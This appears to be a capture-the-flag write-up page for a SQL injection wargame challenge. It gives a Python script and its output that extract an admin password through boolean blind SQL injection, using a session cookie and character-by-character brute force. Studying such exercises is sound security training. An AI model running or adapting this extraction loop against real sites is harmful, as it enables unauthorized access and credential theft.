---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 11
---

## Script

```py title="golem_script.md"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
password_length = 0

for x in range(0, 10):
  payload = f"' || id LIKE 'admin' && length(pw) LIKE {x} -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Password length: {password_length}")
print()

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' || id LIKE 'admin' && substring(pw, {index}, 1) LIKE '{char}' -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted Password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\golem_script.py.py

[!] Payload: ?pw=' || id LIKE 'admin' && length(pw) LIKE 8 -- -
[!] Password length: 8

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 1, 1) LIKE '7' -- -
[+] Character at index 1: 7
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 2, 1) LIKE '7' -- -
[+] Character at index 2: 7
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 3, 1) LIKE 'd' -- -
[+] Character at index 3: d
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 4, 1) LIKE '6' -- -
[+] Character at index 4: 6
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 5, 1) LIKE '2' -- -
[+] Character at index 5: 2
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 6, 1) LIKE '9' -- -
[+] Character at index 6: 9
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 7, 1) LIKE '0' -- -
[+] Character at index 7: 0
[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 8, 1) LIKE 'b' -- -
[+] Character at index 8: b

[!] Extracted password: 77d6290b
[!] Final payload: ?pw=77d6290b
```
